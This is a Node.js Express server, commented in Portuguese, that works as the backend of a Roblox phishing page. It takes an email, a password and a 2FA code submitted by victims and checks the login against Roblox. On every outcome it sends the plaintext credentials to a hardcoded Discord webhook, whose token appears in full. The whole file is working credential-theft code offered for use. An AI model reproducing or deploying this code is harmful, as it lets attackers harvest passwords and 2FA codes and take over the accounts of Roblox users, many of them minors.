const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para fazer login no Roblox (Método Mais Estável)
async function loginRoblox(email, password) {
    const loginUrl = "https://www.roblox.com/users/login";
    
    try {
        // Tenta fazer o POST
        const response = await fetch(loginUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                username: email,
                password: password
            }),
            timeout: 10000
        });

        const data = await response.json();

        // O Roblox retorna:
        // Sucesso: { id: 12345, username: "User" }
        // Erro: { error: "User not found" } ou { error: "Invalid password" }
        
        if (data.id && data.id > 0) {
            return { success: true, data: data, error: null };
        } else {
            // Se não tem ID, verifica o erro específico
            const errorMsg = data.error || "Resposta estranha do Roblox";
            return { success: false, data: data, error: errorMsg };
        }

    } catch (error) {
        return { success: false, data: null, error: "Erro de Conexão: " + error.message };
    }
}

async function sendToDiscord(message) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (e) { console.error(e); }
}

app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.status(400).json({ success: false, error: "Missing email or password" });
    }

    const result = await loginRoblox(email, password);

    if (result.success) {
        const username = result.data.username || "Unknown";
        const userId = result.data.id || "Unknown";
        
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: true,
            username: username,
            userId: userId,
            error: ""
        });
    } else {
        const errorMsg = result.error || "Conta ou Senha Incorretas";
        
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: false,
            username: "Unknown",
            userId: "Unknown",
            error: errorMsg
        });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
